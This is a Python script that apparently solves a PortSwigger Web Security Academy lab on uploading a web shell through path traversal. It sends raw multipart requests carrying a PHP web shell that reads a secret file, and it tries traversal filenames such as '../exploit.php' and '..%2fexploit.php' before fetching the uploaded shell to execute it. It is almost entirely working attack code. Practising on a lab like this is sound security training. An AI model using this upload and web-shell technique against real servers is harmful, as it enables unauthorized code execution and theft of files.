# File upload vulnerabilities 16 of 35
# Lab: Web shell upload via path traversal

import asyncio
from pprint import pprint
from common.base import run_payloads

RAW_REQUEST_POST = """
POST /my-account/avatar HTTP/2
Host: 0a6e00c7049bf4fb806f672b00f30061.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: multipart/form-data; boundary=----geckoformboundarya9c08bac2b07a014fb1d49794da9c3e5
Content-Length: 529
Origin: https://0a6e00c7049bf4fb806f672b00f30061.web-security-academy.net
Connection: keep-alive
Referer: https://0a6e00c7049bf4fb806f672b00f30061.web-security-academy.net/my-account?id=wiener
Cookie: session=5TNHiwuRngTubXOWZh91UwndTq6cMVbx
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
TE: trailers

------geckoformboundarya9c08bac2b07a014fb1d49794da9c3e5
Content-Disposition: form-data; name="avatar"; filename="@@@PAYLOAD@@@"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------geckoformboundarya9c08bac2b07a014fb1d49794da9c3e5
Content-Disposition: form-data; name="user"

wiener
------geckoformboundarya9c08bac2b07a014fb1d49794da9c3e5
Content-Disposition: form-data; name="csrf"

CbTkPWXs7GNRbNJnJlQb1DTFKgzkKXRw
------geckoformboundarya9c08bac2b07a014fb1d49794da9c3e5--

""".strip()

RAW_REQUEST_GET = """
GET @@@PAYLOAD@@@ HTTP/2
Host: 0a6e00c7049bf4fb806f672b00f30061.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: multipart/form-data; boundary=----geckoformboundarya9c08bac2b07a014fb1d49794da9c3e5
Content-Length: 529
Origin: https://0a6e00c7049bf4fb806f672b00f30061.web-security-academy.net
Connection: keep-alive
Referer: https://0a6e00c7049bf4fb806f672b00f30061.web-security-academy.net/my-account?id=wiener
Cookie: session=5TNHiwuRngTubXOWZh91UwndTq6cMVbx
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
TE: trailers
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True)
    return result

async def print_net_result(raw_req, print_response_body=False):
    result = await one_call(raw_req)
    if result['status_code'] == 200:
        secs = result['total_seconds']
        print(f" CALL OK, {secs:.2f} secs")
        if print_response_body: pprint(result['full_text'])
        return True, result['full_text']
    else:
        print(" CALL FAILED")
        if print_response_body: pprint(result['full_text'])
        return False, result['full_text']

def xmlencode (text: str) -> str:
    return "".join(f"&#x{ord(c):X};" for c in text)

async def main():

    # Original post
    raw_req_0 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", "exploit.php")
    print('PLAIN POST:', end='')
    await print_net_result(raw_req_0, False)

    # Original get
    raw_req_1 = RAW_REQUEST_GET.replace("@@@PAYLOAD@@@", "/files/avatars/exploit.php")
    print('PLAIN GET:', end='')
    await print_net_result(raw_req_1, True)


    raw_req_7 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", "../exploit.php")
    print('path-traversal POST:', end='')
    await print_net_result(raw_req_7, True)

    raw_req_9 = RAW_REQUEST_POST.replace("@@@PAYLOAD@@@", "..%2fexploit.php")
    print('path-traversal POST with encoding:', end='')
    await print_net_result(raw_req_9, True)

    raw_req_12 = RAW_REQUEST_GET.replace("@@@PAYLOAD@@@", "/files/avatars/../exploit.php")
    print('path-traversal GET with encoding:', end='')
    await print_net_result(raw_req_12, True)

if __name__ == "__main__":
    asyncio.run(main())